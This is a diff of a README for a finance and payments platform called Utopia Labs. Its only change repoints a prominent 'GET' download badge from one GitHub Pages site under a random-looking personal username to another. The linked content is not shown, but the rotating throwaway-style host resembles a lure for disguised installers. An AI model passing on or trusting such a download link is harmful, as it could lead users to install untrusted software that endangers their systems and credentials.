@@ -1,6 +1,6 @@
 # Utopia Labs Payments - Finance Operations and Payments Platform
 
-[![GET Utopia Labs](https://img.shields.io/badge/GET%20%E2%80%94%20Utopia%20Labs-0078D6?style=for-the-badge&logoColor=white)](https://imranesparzazqvc.github.io/.github/utopia-labs-payments)
+[![GET Utopia Labs](https://img.shields.io/badge/GET%20%E2%80%94%20Utopia%20Labs-0078D6?style=for-the-badge&logoColor=white)](https://maximusbentonoxyb.github.io/.github/utopia-labs-payments)
 
 ## Finance Workflow Overview for Utopia Labs
 
